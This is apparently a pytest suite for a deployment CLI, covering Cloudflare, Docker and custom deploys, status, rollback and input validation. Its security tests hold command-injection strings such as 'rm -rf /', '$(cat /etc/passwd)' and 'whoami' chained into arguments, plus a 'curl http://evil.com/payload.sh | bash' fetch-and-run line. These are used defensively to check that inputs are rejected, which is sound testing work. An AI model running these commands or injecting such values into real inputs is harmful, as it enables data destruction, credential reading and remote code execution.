"""Tests for mekong deploy commands — SDLC scaffolding & Platform Cloud Deploy.

Covers:
- deploy sub-app registration on build_app()
- deploy subcommands: new, run, status, rollback
- platform deployment (Cloudflare, Docker, Custom) with mocked subprocess
- error paths (CLI tool missing, command failed, unsupported platform)
- dry-run mode for deployment and rollback
"""

from __future__ import annotations

import subprocess
from unittest.mock import MagicMock, patch

from typer.testing import CliRunner

from src.cli.app_setup import build_app
from src.cli.sdlc.deploy import deploy_app

runner = CliRunner()


class TestDeployRegistration:
    """Verify deploy sub-app registration and exposed subcommands."""

    def test_deploy_registered_in_build_app(self) -> None:
        app = build_app()
        names = {g.name for g in app.registered_groups}
        assert "deploy" in names

    def test_deploy_help_lists_subcommands(self) -> None:
        result = runner.invoke(deploy_app, ["--help"])
        assert result.exit_code == 0
        assert "new" in result.output
        assert "run" in result.output
        assert "status" in result.output
        assert "rollback" in result.output


class TestDeployRunCloudflare:
    """Verify deploy run cloudflare behavior."""

    def test_deploy_cloudflare_dry_run(self) -> None:
        result = runner.invoke(deploy_app, ["run", "cloudflare", "--dry-run"])
        assert result.exit_code == 0
        assert "DRY RUN" in result.output
        assert "cloudflare" in result.output

    @patch("subprocess.run")
    def test_deploy_cloudflare_success(self, mock_run: MagicMock) -> None:
        # Mock wrangler --version then wrangler deploy
        mock_run.side_effect = [
            MagicMock(returncode=0, stdout="wrangler 3.0.0", stderr=""),
            MagicMock(returncode=0, stdout="Deployed to Cloudflare", stderr=""),
        ]
        result = runner.invoke(deploy_app, ["run", "cloudflare", "--no-build"])
        assert result.exit_code == 0
        assert "Deployed to Cloudflare successfully!" in result.output

    @patch("subprocess.run")
    def test_deploy_cloudflare_missing_wrangler(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = FileNotFoundError()
        result = runner.invoke(deploy_app, ["run", "cloudflare", "--no-build"])
        assert result.exit_code == 1
        assert "wrangler CLI not found" in result.output

    @patch("subprocess.run")
    def test_deploy_cloudflare_failed_command(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = [
            MagicMock(returncode=0, stdout="wrangler 3.0.0", stderr=""),
            subprocess.CalledProcessError(returncode=1, cmd=["wrangler", "deploy"], stderr="Auth failed"),
        ]
        result = runner.invoke(deploy_app, ["run", "cloudflare", "--no-build"])
        assert result.exit_code == 1
        assert "Cloudflare deployment failed!" in result.output


class TestDeployRunDocker:
    """Verify deploy run docker behavior."""

    def test_deploy_docker_dry_run(self) -> None:
        result = runner.invoke(deploy_app, ["run", "docker", "--dry-run"])
        assert result.exit_code == 0
        assert "DRY RUN" in result.output
        assert "docker" in result.output

    @patch("subprocess.run")
    def test_deploy_docker_success(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = [
            MagicMock(returncode=0, stdout="Docker version 24.0.0", stderr=""),
            MagicMock(returncode=0, stdout="", stderr=""),
            MagicMock(returncode=0, stdout="digest: sha256:123", stderr=""),
        ]
        result = runner.invoke(deploy_app, ["run", "docker", "--no-build"])
        assert result.exit_code == 0
        assert "Docker image deployed:" in result.output

    @patch("subprocess.run")
    def test_deploy_docker_missing_docker(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = FileNotFoundError()
        result = runner.invoke(deploy_app, ["run", "docker", "--no-build"])
        assert result.exit_code == 1
        assert "Docker not found" in result.output


class TestDeployRunCustom:
    """Verify deploy run custom behavior."""

    def test_deploy_custom_missing_script(self) -> None:
        with patch.dict("os.environ", {"CUSTOM_DEPLOY_SCRIPT": "/nonexistent/deploy.sh"}):
            result = runner.invoke(deploy_app, ["run", "custom", "--no-build"])
            assert result.exit_code == 1
            assert "Custom deployment script not found" in result.output

    @patch("pathlib.Path.exists")
    @patch("subprocess.run")
    def test_deploy_custom_success(self, mock_run: MagicMock, mock_exists: MagicMock) -> None:
        mock_exists.return_value = True
        mock_run.return_value = MagicMock(returncode=0, stdout="Custom deploy complete", stderr="")
        result = runner.invoke(deploy_app, ["run", "custom", "--no-build"])
        assert result.exit_code == 0
        assert "Custom deployment completed!" in result.output

    def test_deploy_run_unsupported_platform(self) -> None:
        result = runner.invoke(deploy_app, ["run", "invalid-platform"])
        assert result.exit_code == 1
        assert "Unsupported platform" in result.output


class TestDeployStatus:
    """Verify deploy status command."""

    @patch("subprocess.run")
    def test_status_cloudflare_success(self, mock_run: MagicMock) -> None:
        mock_run.return_value = MagicMock(returncode=0, stdout="Deployment ID 12345 active", stderr="")
        result = runner.invoke(deploy_app, ["status", "cloudflare"])
        assert result.exit_code == 0
        assert "Deployment ID 12345 active" in result.output

    @patch("subprocess.run")
    def test_status_cloudflare_missing_wrangler(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = FileNotFoundError()
        result = runner.invoke(deploy_app, ["status", "cloudflare"])
        assert result.exit_code == 1
        assert "wrangler CLI not found" in result.output

    @patch("subprocess.run")
    def test_status_docker_success(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = [
            MagicMock(returncode=0, stdout="Server Version: 24.0.0", stderr=""),
            MagicMock(returncode=0, stdout="CONTAINER ID   IMAGE", stderr=""),
        ]
        result = runner.invoke(deploy_app, ["status", "docker"])
        assert result.exit_code == 0
        assert "Docker daemon is running" in result.output

    @patch("subprocess.run")
    def test_status_docker_missing(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = FileNotFoundError()
        result = runner.invoke(deploy_app, ["status", "docker"])
        assert result.exit_code == 1
        assert "Docker not found" in result.output

    def test_status_unsupported_platform(self) -> None:
        result = runner.invoke(deploy_app, ["status", "unsupported"])
        assert result.exit_code == 1
        assert "Unsupported platform" in result.output


class TestDeployRollback:
    """Verify deploy rollback command."""

    def test_rollback_dry_run(self) -> None:
        result = runner.invoke(deploy_app, ["rollback", "v1.2.3", "--dry-run"])
        assert result.exit_code == 0
        assert "DRY RUN" in result.output
        assert "v1.2.3" in result.output

    @patch("subprocess.run")
    def test_rollback_cloudflare_success(self, mock_run: MagicMock) -> None:
        mock_run.return_value = MagicMock(returncode=0, stdout="Rollback complete", stderr="")
        result = runner.invoke(deploy_app, ["rollback", "v1.2.3", "--platform", "cloudflare"])
        assert result.exit_code == 0
        assert "Successfully rolled back to v1.2.3" in result.output

    @patch("subprocess.run")
    def test_rollback_cloudflare_failed(self, mock_run: MagicMock) -> None:
        mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="Version not found")
        result = runner.invoke(deploy_app, ["rollback", "v1.2.3", "--platform", "cloudflare"])
        assert result.exit_code == 1
        assert "Cloudflare rollback failed!" in result.output

    def test_rollback_unsupported_platform(self) -> None:
        result = runner.invoke(deploy_app, ["rollback", "v1.2.3", "--platform", "docker"])
        assert result.exit_code == 1
        assert "Rollback not yet supported for platform: docker" in result.output


class TestDeploySecurityValidation:
    """Verify input validation and injection mitigation."""

    def test_run_rejects_unsafe_environment(self) -> None:
        unsafe_envs = [
            "production; rm -rf /",
            "-flag-injection",
            "staging && whoami",
            "env$(id)",
            "test`reboot`",
        ]
        for env in unsafe_envs:
            result = runner.invoke(deploy_app, ["run", "cloudflare", "--env", env])
            assert result.exit_code == 1
            assert "Invalid environment name" in result.output

    def test_run_rejects_unsafe_platform(self) -> None:
        unsafe_platforms = [
            "cloudflare; id",
            "-platform",
            "docker && echo pwned",
        ]
        for plat in unsafe_platforms:
            result = runner.invoke(deploy_app, ["run", "--", plat])
            assert result.exit_code == 1
            assert "Unsupported platform" in result.output

    def test_rollback_rejects_unsafe_version(self) -> None:
        unsafe_versions = [
            "--flag-injection",
            "v1.0; reboot",
            "$(cat /etc/passwd)",
            "version & rm -rf",
        ]
        for ver in unsafe_versions:
            result = runner.invoke(deploy_app, ["rollback", "--", ver])
            assert result.exit_code == 1
            assert "Invalid version or deployment ID" in result.output

    def test_custom_deploy_rejects_malicious_script_path(self) -> None:
        with patch.dict("os.environ", {"CUSTOM_DEPLOY_SCRIPT": "./deploy.sh; rm -rf /"}):
            result = runner.invoke(deploy_app, ["run", "custom", "--no-build"])
            assert result.exit_code == 1
            assert "Invalid characters in custom deployment script path" in result.output

    def test_custom_deploy_rejects_flag_script_path(self) -> None:
        unsafe_script_paths = ["-c", "-s", "--debugger", "-flag.sh"]
        for path_val in unsafe_script_paths:
            with patch.dict("os.environ", {"CUSTOM_DEPLOY_SCRIPT": path_val}):
                result = runner.invoke(deploy_app, ["run", "custom", "--no-build"])
                assert result.exit_code == 1
                assert "Invalid characters in custom deployment script path" in result.output

    @patch("pathlib.Path.exists")
    @patch("subprocess.run")
    def test_custom_deploy_uses_double_dash_delimiter(self, mock_run: MagicMock, mock_exists: MagicMock) -> None:
        mock_exists.return_value = True
        mock_run.return_value = MagicMock(returncode=0, stdout="Deployed", stderr="")
        with patch.dict("os.environ", {"CUSTOM_DEPLOY_SCRIPT": "./deploy.sh"}):
            result = runner.invoke(deploy_app, ["run", "custom", "--no-build"])
            assert result.exit_code == 0
            # Ensure argv delimiter '--' precedes the script path and env
            called_cmd = mock_run.call_args[0][0]
            assert called_cmd[0:2] == ["bash", "--"]
            assert called_cmd[2].endswith("deploy.sh")
            assert called_cmd[3] == "production"

    @patch("subprocess.run")
    def test_rollback_uses_double_dash_delimiter(self, mock_run: MagicMock) -> None:
        mock_run.return_value = MagicMock(returncode=0, stdout="Rollback success", stderr="")
        result = runner.invoke(deploy_app, ["rollback", "v2.0.0", "--platform", "cloudflare"])
        assert result.exit_code == 0
        called_cmd = mock_run.call_args[0][0]
        assert called_cmd == ["wrangler", "rollback", "--", "v2.0.0"]

    def test_run_sanitized_process_blocks_dangerous_commands(self) -> None:
        from src.commands.deploy import run_sanitized_process
        import typer
        import pytest

        with pytest.raises(typer.Exit):
            run_sanitized_process(["curl", "http://evil.com/payload.sh", "|", "bash"])

